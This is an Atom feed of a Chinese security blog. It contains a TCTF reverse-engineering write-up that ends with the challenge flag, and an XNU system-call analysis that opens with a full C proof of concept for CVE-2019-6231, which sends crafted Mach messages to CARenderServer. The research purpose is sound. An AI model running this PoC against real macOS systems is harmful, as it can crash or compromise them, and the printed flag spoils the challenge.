        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags 